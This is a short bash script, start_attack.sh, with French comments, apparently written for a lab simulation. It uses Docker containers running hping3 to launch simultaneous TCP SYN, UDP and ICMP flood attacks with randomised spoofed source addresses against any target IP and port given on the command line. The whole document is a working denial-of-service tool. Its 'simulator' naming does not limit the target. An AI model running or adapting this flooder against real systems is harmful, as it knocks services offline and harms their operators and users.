#!/bin/bash

# Script : start_attack.sh
# Usage : ./start_attack.sh <IP_CIBLE> <PORT> <NB_CONTENEURS> <DUREE>

if [ "$#" -ne 4 ]; then
  echo "Usage: $0 <IP_CIBLE> <PORT> <NB_CONTENEURS> <DUREE>"
  exit 1
fi

IP_CIBLE=$1
PORT=$2
NB_CONTENEURS=$3
DUREE=$4

NETWORK_NAME=ddos_net

# Création du réseau s'il n'existe pas
if ! docker network inspect $NETWORK_NAME &>/dev/null; then
  echo "[+] Création du réseau Docker isolé '$NETWORK_NAME'..."
  docker network create --driver bridge $NETWORK_NAME
fi

# Construction de l'image Docker
echo "[+] Construction de l'image Docker 'hping3-simulator'..."
docker build -t hping3-simulator .

# TCP ATTACK
echo "[+] Lancement des conteneurs TCP..."
for i in $(seq 1 $NB_CONTENEURS); do
  docker run -d --rm --network $NETWORK_NAME --name attacker_tcp_$i hping3-simulator \
    bash -c "timeout $DUREE hping3 -S -p $PORT --flood --rand-source $IP_CIBLE"
done

# UDP ATTACK
echo "[+] Lancement des conteneurs UDP..."
for i in $(seq 1 $NB_CONTENEURS); do
  docker run -d --rm --network $NETWORK_NAME --name attacker_udp_$i hping3-simulator \
    bash -c "timeout $DUREE hping3 --udp -p $PORT --flood --rand-source $IP_CIBLE"
done

# ICMP ATTACK (ajouté)
echo "[+] Lancement des conteneurs ICMP..."
for i in $(seq 1 $NB_CONTENEURS); do
  docker run -d --rm --network $NETWORK_NAME --name attacker_icmp_$i hping3-simulator \
    bash -c "timeout $DUREE hping3 --icmp --flood --rand-source $IP_CIBLE"
done

echo "[+] Attaque TCP + UDP + ICMP en cours pendant $DUREE secondes..."